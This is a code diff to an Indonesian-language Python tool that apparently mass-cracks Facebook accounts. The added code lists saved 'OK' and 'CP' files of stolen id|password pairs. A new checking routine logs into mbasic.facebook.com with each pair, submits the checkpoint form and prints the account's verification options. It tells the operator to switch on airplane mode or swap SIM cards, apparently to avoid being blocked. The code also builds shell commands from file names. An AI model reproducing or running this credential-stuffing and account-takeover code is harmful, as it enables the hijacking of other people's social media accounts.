@@ -24,7 +24,7 @@ thn = datetime.datetime.now().year
 sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
 cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
 okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
-id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD=[],0,[],[],[],0,0,[],[],[],[],0
+id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD,akun=[],0,[],[],[],0,0,[],[],[],[],0,[]
 pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
 
 for xyzx in range(1000):
@@ -289,6 +289,7 @@ def login_cookie():
 			open('token.txt','w').write(token)
 			x=f"{P2}{token}"
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			turu(0.05)
 			#input(f"{garis} enter untuk ke menu ")
 			menu()
 		except requests.exceptions.ConnectionError:
@@ -361,13 +362,13 @@ def menu():
 	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	print("")
-	x=f"{P2}[01] crack with public\n{P2}[02] checkpoint detectored\n{P2}[{M2}00{P2}] exit/delete cookie"
+	x=f"{P2}[01] crack with public\n{P2}[02] hasil crack\n{P2}[{M2}00{P2}] exit/delete cookie"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	HikmatXD = input(f"{garis} pilih : {H}")
 	if HikmatXD in ["1","01"]:
 		cracked_publickey()
 	elif HikmatXD in ["2","02"]:
-		check_detect()
+		hasil_crack()
 	elif HikmatXD in ["0","00"]:
 		print("")
 		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
@@ -401,12 +402,122 @@ def menu():
 		jalan(f"{garis} isi yang benar ")
 		menu()
 
+def hasil_crack():
+	print("")
+	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	inhasil = input(f"{garis} pilih : {H}")
+	if inhasil in ["1","01"]:
+		try:c_o_k = os.listdir('OK')
+		except FileNotFoundError:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_crack()
+		if len(c_o_k)==0:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_crack()
+		else:
+			x=f"\t\t{P2} hasil ok"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			cuih = 0
+			lol = {}
+			for kaoo in c_o_k:
+				try:hikmat = open('OK/'+kaoo,'r').readlines()
+				except:continue
+				cuih+=1
+				if cuih<10:
+					__oo = '0'+str(cuih)
+					lol.update({str(cuih):str(kaoo)})
+					lol.update({__oo:str(kaoo)})
+					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+				else:
+					lol.update({str(cuih):str(kaoo)})
+					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+			x=f"{P2}pilih hasil untuk ditampilkan"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			geeh = input(garis+" pilih : "+H)
+			try:geh = lol[geeh]
+			except KeyError:
+				print(garis+" pilihan tidak ada")
+				exit()
+			try:lin = open('OK/'+geh,'r').read()
+			except:
+				jalan(garis+" file tidak ditemukan") 
+				time.sleep(2)
+				hasil_crack()
+			jalan(garis+" list akun ok kamu\n") 
+			#x=f"{P2}cd OK*-->{geh}"
+			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			hus = os.system('cd OK && cat '+geh)
+			jalan("\n"+garis+" list akun ok kamu") 
+			input(garis+" Kembali")
+			menu()
+	elif inhasil in ["2","02"]:
+		try:c_o_k = os.listdir('CP')
+		except FileNotFoundError:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_crack()
+		if len(c_o_k)==0:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_crack()
+		else:
+			x=f"\t\t{P2} hasil cp"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			cuih = 0
+			lol = {}
+			for kaoo in c_o_k:
+				try:hikmat = open('CP/'+kaoo,'r').readlines()
+				except:continue
+				cuih+=1
+				if cuih<10:
+					__oo = '0'+str(cuih)
+					lol.update({str(cuih):str(kaoo)})
+					lol.update({__oo:str(kaoo)})
+					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+				else:
+					lol.update({str(cuih):str(kaoo)})
+					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+			x=f"{P2}pilih hasil untuk ditampilkan"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			geeh = input(garis+" pilih : "+H)
+			try:geh = lol[geeh]
+			except KeyError:
+				print(garis+" pilihan tidak ada")
+				exit()
+			try:lin = open('CP/'+geh,'r').read()
+			except:
+				jalan(garis+" file tidak ditemukan") 
+				time.sleep(2)
+				hasil_crack()
+			jalan(garis+" list akun cp kamu\n") 
+			#x=f"{P2}cd CP*-->{geh}"
+			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			hus = os.system('cd CP && cat '+geh)
+			jalan("\n"+garis+" list akun cp kamu") 
+			input(garis+" Kembali")
+			menu()
+	elif inhasil in ["0","00"]:
+		menu()
+	else:
+		jalan(f"{garis} isi yang benar ")
+		hasil_crack()
 
 def cracked_publickey():
 	print("")
 	x=f"{P2}ketik {H2}y{P2} untuk crack massal public\n{P2}ketik {H2}t{P2} untuk crack public"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}/{K}g{P}) ? : {H}")
+	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}) ? : {H}")
 	if cuy in ["y","Y"]:
 		massal_cracked_public()
 	elif cuy in ["t","T"]:
@@ -1312,6 +1423,111 @@ def api(uiz,pwr):
 			continue
 	
 	HikmatXD +=1
+
+def check_detect():
+	print("")
+	x=f"\t\t{P2}sedang membaca file, tunggu sebentar ..."
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	time.sleep(2)
+	x=f"{P2}pilih file yang akan dicek"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	my_files = []
+	try:
+		mer = os.listdir('CP')
+		for ty in mer:
+			my_files.append(ty)
+	except:pass
+	if len(my_files)==0:
+		jalan(garis+" tidak ada hasil untuk dicek")
+		exit()
+	else:
+		cih = 0
+		#lol = {}
+		for isi in my_files:
+			try:hem = open('CP/'+isi,'r').readlines()
+			except:continue
+			cih+=1
+			if cih<10:
+				nom = '0'+str(cih)
+				#lol.update({str(cih):str(isi)})
+				#lol.update({nom:str(isi)})
+				x=f"{P2}[{H2}{nom}{P2}] {isi} • {str(len(hem))} akun{P2}"
+				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+				#print(' ['+H+nom+P+'] '+isi+' • '+str(len(hem))+' akun'+P)
+			else:
+				#lol.update({str(cih):str(isi)})
+				x=f"{P2}[{H2}{str(cih)}{P2}] {isi} • {str(len(hem))} akun{P2}"
+				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+				#print(' ['+H+str(cih)+P+'] '+isi+' • '+str(len(hem))+' akun'+P)
+		x=f"{P2}pilih file yang akan dicek"
+		geeh = input(garis+" pilih :%s "%(H))
+		try:geh = geeh
+		except KeyError:
+			jalan(garis+" pilihan tidak ada dimenu")
+		except IOError:
+			try:
+				hf = open('CP/'+geh,'r').readlines()
+				for fz in hf:
+					akun.append(fz.replace('\n',''))
+				cek_opsi_cp2()
+			except IOError:
+				print(garis+" file Tidak Ditemukan")
+				time.sleep(2)
+				exit()
+def cek_opsi_cp2():
+	c = len(akun)
+	x=f"{P2}terdapat {H2}{c}{P2} akun untuk dicek\nsebelum mulai, mode pesawat/ubah kartu sim terlebih dahulu"
+	input(garis+" mulai")
+	jalan(garis+" proses check dimulai")
+	love = 0
+	for kes in akun:
+		try:
+			try:
+				id,pw = kes.split('|')[0],kes.split('|')[1]
+			except IndexError:
+				time.sleep(2)
+				print('\r%s • %s • error      %s'%(H,kes,H))
+				print("\r"+maling_pangsit+" pemisah tidak didukung untuk program ini%s")
+				continue
+			bi = random.choice([P,K,H,J,B,O])
+			print('\r%s • %s/%s • [ %s ]%s'%(bi,love,len(akun),id,P), end=' ');sys.stdout.flush()
+			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
+			ses = requests.Session()
+			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			hi = ses.get('https://mbasic.facebook.com')
+			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				try:
+					jo = ho.find('form')
+					data = {}
+					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
+					for anj in jo('input'):
+						if anj.get('name') in lion:
+							data.update({anj.get('name'):anj.get('value')})
+					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
+					print('\r %s*-->  %s|%s'%(K,id,pw))
+					opsi = kent.find_all('option')
+					if len(opsi)==0:
+						print('\r%s • tap yes/a2f ( cek login di lite/mbasic%s )'%(P,H))
+					else:
+						for opsii in opsi:
+							print('\r%s • %s%s'%(H,opsii.text,P))
+				except:
+					print('\r %s*-->  %s|%s'%(K,id,pw))
+					print(maling_pangsit+"\r tidak dapat mengecek opsi")
+			elif "c_user" in ses.cookies.get_dict().keys():
+				print('\r %s*-->  %s|%s'%(H,id,pw))
+			else:
+				print('\r %s*-->  %s|%s'%(M,id,pw))
+			love+=1
+		except requests.exceptions.ConnectionError:
+			print('')
+			print(garis+" koneksi internet bermasalah")
+			exit()
+	print("")
+	print(garis+" beres")
+	input(garis+" enter untuk kembali ")
+	menu()
 
 def opsi_detect(uiz,pw):
 	global cp
